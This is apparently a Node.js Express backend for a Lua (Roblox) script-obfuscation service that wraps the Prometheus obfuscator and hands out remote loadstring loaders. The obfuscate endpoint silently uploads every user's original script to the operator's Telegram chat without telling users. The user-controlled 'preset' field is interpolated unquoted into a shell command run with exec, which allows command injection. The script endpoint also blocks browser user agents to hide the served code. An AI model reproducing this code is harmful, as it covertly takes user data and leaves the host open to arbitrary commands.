const express = require('express');
const cors = require('cors');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================================
//  KONFIGURASI TELEGRAM
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'ISI_TOKEN_BOT_KAMU';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || 'ISI_CHAT_ID_KAMU';
// ============================================================

const scriptDatabase = new Map();
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM (DOKUMEN) ──────────
function sendTelegramFile(scriptContent, scriptId, preset) {
    const filename = `script_${scriptId}.lua`;
    const caption = `🔔 <b>Script Baru Diobfuskasi!</b>\n🆔 <b>ID:</b> <code>${scriptId}</code>\n⚙️ <b>Preset:</b> <code>${preset}</code>\n📏 <b>Panjang:</b> ${scriptContent.length} char\n🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC`;

    const boundary = '----TelegramBoundary' + Date.now().toString(16);
    let payload = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`;
    payload += `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`;
    payload += `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n`;
    payload += `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${filename}"\r\nContent-Type: text/plain\r\n\r\n${scriptContent}\r\n`;
    payload += `--${boundary}--\r\n`;

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': Buffer.byteLength(payload)
        }
    };

    const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => console.log('[TELEGRAM DOC]', data));
    });
    req.on('error', err => console.error('[TELEGRAM DOC ERROR]', err));
    req.write(payload);
    req.end();
}

// ─── FUNGSI OBFUSKASI PROMETHEUS ────────────────────────────
function obfuscateWithPrometheus(scriptContent, preset) {
    return new Promise((resolve, reject) => {
        const tempId = Date.now();
        const inputPath  = path.join(tempDir, `input_${tempId}.lua`);
        const outputPath = path.join(tempDir, `input_${tempId}.obfuscated.lua`);

        fs.writeFileSync(inputPath, scriptContent);

        // Path Prometheus (Sesuaikan jika berbeda)
        const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
        
        // Menggunakan parameter 'preset' yang dipilih user
        const command = `lua5.3 "${prometheusPath}" --preset ${preset} "${inputPath}"`;

        console.log(`[EXEC] Menggunakan preset: ${preset}`);

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error("=== ERROR PROMETHEUS ===", stderr);
                if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
                return reject(`Gagal obfuscate dengan preset ${preset}.`);
            }

            if (fs.existsSync(outputPath)) {
                const obfuscatedCode = fs.readFileSync(outputPath, 'utf8');
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
                resolve(obfuscatedCode);
            } else {
                reject("File output tidak ditemukan.");
            }
        });
    });
}

// ─── ENDPOINT OBFUSKASI ──────────────────────────────────────
app.post('/api/obfuscate', async (req, res) => {
    const { script, preset } = req.body;
    if (!script) return res.status(400).json({ error: "Script kosong!" });
    
    // Default ke Medium jika preset tidak dikirim
    const selectedPreset = preset || 'Medium';

    try {
        const tempId = Date.now().toString();
        
        // Log ke Telegram (Termasuk info preset yang dipilih)
        sendTelegramFile(script, tempId, selectedPreset);

        const obfuscatedCode = await obfuscateWithPrometheus(script, selectedPreset);

        const scriptId = Math.floor(Math.random() * 10000000000000).toString();
        scriptDatabase.set(scriptId, obfuscatedCode);

        const protocol = req.headers['x-forwarded-proto'] || req.protocol;
        const host = req.headers['x-forwarded-host'] || req.headers.host;
        const loaderScript = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;

        res.json({ success: true, loader: loaderScript });
    } catch (error) {
        res.status(500).json({ error: error.toString() });
    }
});

// ─── ENDPOINT SCRIPTS ────────────────────────────────────────
app.get('/Scripts', (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    const isBrowser = /Mozilla|Chrome|Safari|Firefox|Opera|Edge|MSIE/i.test(userAgent);
    
    if (isBrowser) {
        return res.status(403).sendFile(path.join(__dirname, 'public', '403.html'));
    }

    const scriptId   = req.query.Id;
    const scriptCode = scriptDatabase.get(scriptId);

    if (scriptCode) {
        res.setHeader('Content-Type', 'text/plain');
        res.send(scriptCode);
    } else {
        res.status(404).send("-- Script expired / not found");
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server live on port ${PORT}`));
